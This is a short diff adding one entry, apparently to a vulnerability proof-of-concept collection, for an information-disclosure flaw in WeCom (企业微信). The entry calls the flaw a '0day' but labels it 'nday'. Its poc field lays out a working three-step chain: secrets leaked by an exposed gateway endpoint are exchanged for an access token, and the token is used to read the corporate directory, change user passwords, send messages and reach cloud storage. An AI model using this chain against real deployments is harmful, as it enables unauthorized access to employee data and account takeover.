@@ -1,0 +1,8 @@
+vendor = "企业微信"
+name = "企业微信0day"
+type = "信息泄露"
+source = "微信"
+info = "/cgi-bin/gateway/agentinfo"
+date = "08.14"
+poc = "第一步：，通过泄露信息接口可以获取corpid和corpsecret https://<企业微信域名>/cgi-bin/gateway/agentinfo 第二步，使用corpsecret和corpid获得token https://<企业微信域名>/cgi-bin/gettoken?corpid=ID&corpsecret=SECRET 第三步，使用token访问诸如企业通讯录信息，修改用户密码，发送消息，云盘等接口 https://<企业微信域名>/cgi-bin/user/get?access_token=ACCESS_TOKEN&userid=USERID"
+label = "nday"
